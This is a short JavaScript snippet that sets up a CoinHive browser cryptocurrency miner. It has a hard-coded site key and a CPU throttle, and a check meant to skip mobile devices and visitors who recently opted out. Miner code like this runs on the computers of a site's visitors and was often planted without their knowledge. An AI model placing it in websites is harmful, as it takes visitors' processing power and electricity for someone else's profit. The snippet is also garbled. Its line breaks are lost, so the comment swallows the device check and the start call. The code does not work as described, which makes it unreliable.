var miner = new CoinHive.Anonymous('OK6Fy7Sc0WkRYIVVaVqS2qwSt89tA2Fe', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}